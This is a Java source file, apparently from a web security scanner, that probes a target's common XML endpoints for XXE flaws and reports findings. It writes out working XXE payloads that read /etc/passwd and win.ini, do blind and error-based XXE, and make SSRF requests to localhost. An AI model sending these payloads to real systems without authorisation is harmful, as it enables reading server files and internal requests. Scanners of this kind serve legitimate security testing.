package it.r2u.anibus.service.analysis;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.function.DoubleConsumer;

/**
 * XXE (XML External Entity) injection detector.
 * Sends crafted XML payloads containing entity references to common XML-accepting
 * endpoints and looks for indicators that the entity was resolved by the server.
 */
public class XxeDetector {

    private static final int TIMEOUT = 8000;

    /** Canary string we embed in entity declarations; its presence in the response indicates XXE. */
    private static final String CANARY = "xxe-anibus-7k3b";

    /** Marker used by error-based payloads — forces parser to mention a non-existent path. */
    private static final String ERROR_MARKER = "anibus-nope-" + CANARY;

    /**
     * XXE payloads — each tries a different technique:
     * classic file read, error-based, SSRF via DTD.
     */
    private static final List<String> PAYLOADS = List.of(
        // Classic: try to read /etc/passwd
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        // Windows path
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>",
        // Error-based blind XXE
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root/>",
        // SSRF to localhost
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><root>&xxe;</root>",
        // Billion laughs — send small payload to detect parse but don't actually use it
        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><root>&lol2;</root>",
        // Error-based via undefined system path — server echoes parser error containing our marker,
        // confirming the DTD was actually parsed (works even when out-of-band is blocked).
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///" + ERROR_MARKER + "\">]><root>&xxe;</root>",
        // Error-based via SSRF to closed local port — expect "Connection refused" in parser output
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:1/" + ERROR_MARKER + "\">]><root>&xxe;</root>"
    );

    /** Strings in the response body that indicate successful XXE exploitation. */
    private static final List<String> INDICATORS = List.of(
        "root:x:0:0",     // /etc/passwd content
        "daemon:x:",
        "/bin/bash",
        "[fonts]",        // win.ini
        "for 16-bit",     // win.ini
        "127.0.0.1",      // SSRF reflected
        "localhost",
        "Connection refused", // error-based SSRF probe
        "failed to open stream", // PHP libxml error
        "DOCTYPE is disallowed", // sometimes leaks raw parser msg
        ERROR_MARKER,         // our error-based marker echoed back
        CANARY
    );

    /** Common endpoints that accept XML. */
    private static final List<String> XML_PATHS = List.of(
        "/", "/api", "/api/v1", "/upload", "/import",
        "/xml", "/soap", "/wsdl", "/service", "/ws",
        "/process", "/parse", "/data", "/feed", "/rss"
    );

    public record XxeResult(
        String url,
        String payload,
        boolean vulnerable,
        String evidence
    ) {
        public String risk() { return vulnerable ? "CRITICAL" : "NONE"; }
    }

    /**
     * Probes the target URL for XXE vulnerabilities.
     *
     * @param baseUrl  Target base URL
     * @param progress 0.0–1.0 progress callback
     * @return List of findings
     */
    public List<XxeResult> scan(String baseUrl, DoubleConsumer progress) {
        List<XxeResult> findings = new ArrayList<>();
        if (baseUrl == null || baseUrl.isBlank()) return findings;

        String base = baseUrl.replaceAll("/$", "");
        int total = XML_PATHS.size() * PAYLOADS.size();
        int done = 0;

        for (String path : XML_PATHS) {
            String url = base + path;
            for (String payload : PAYLOADS) {
                XxeResult r = probe(url, payload);
                if (r != null && r.vulnerable()) findings.add(r);
                done++;
                if (progress != null) progress.accept((double) done / total);
            }
        }
        return findings;
    }

    private XxeResult probe(String url, String payload) {
        try {
            HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(TIMEOUT);
            conn.setReadTimeout(TIMEOUT);
            conn.setRequestProperty("Content-Type", "application/xml");
            conn.setRequestProperty("Accept", "*/*");

            byte[] bodyBytes = payload.getBytes(StandardCharsets.UTF_8);
            conn.setRequestProperty("Content-Length", String.valueOf(bodyBytes.length));
            try (OutputStream os = conn.getOutputStream()) {
                os.write(bodyBytes);
            }

            int status = conn.getResponseCode();
            if (status == 0) return null;

            String body = "";
            try {
                body = new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            } catch (IOException ignored) {
                try {
                    body = new String(conn.getErrorStream().readAllBytes(), StandardCharsets.UTF_8);
                } catch (IOException | NullPointerException ignored2) { }
            }
            conn.disconnect();

            for (String indicator : INDICATORS) {
                if (body.contains(indicator)) {
                    String evidence = extractWindow(body, indicator, 150);
                    return new XxeResult(url, abbreviate(payload, 80), true,
                        "Indicator '" + indicator + "' in response: " + evidence);
                }
            }

        } catch (IOException | IllegalArgumentException ignored) { }
        return null;
    }

    private String extractWindow(String text, String needle, int window) {
        int idx = text.indexOf(needle);
        if (idx < 0) return "";
        int start = Math.max(0, idx - window / 2);
        int end   = Math.min(text.length(), idx + needle.length() + window / 2);
        return "…" + text.substring(start, end).replaceAll("\\s+", " ").trim() + "…";
    }

    private String abbreviate(String s, int max) {
        if (s == null || s.length() <= max) return s;
        return s.substring(0, max) + "…";
    }

    public static String formatReport(List<XxeResult> results, String baseUrl) {
        StringBuilder sb = new StringBuilder("=== XXE SCAN: ").append(baseUrl).append(" ===\n");
        if (results == null || results.isEmpty()) {
            sb.append("  No XXE indicators detected.\n");
            return sb.toString();
        }
        sb.append("  ").append(results.size()).append(" potential XXE finding(s):\n");
        for (XxeResult r : results) {
            sb.append("\n  [").append(r.risk()).append("] ").append(r.url()).append("\n");
            sb.append("    payload : ").append(r.payload()).append("\n");
            sb.append("    evidence: ").append(r.evidence()).append("\n");
        }
        return sb.toString();
    }
}
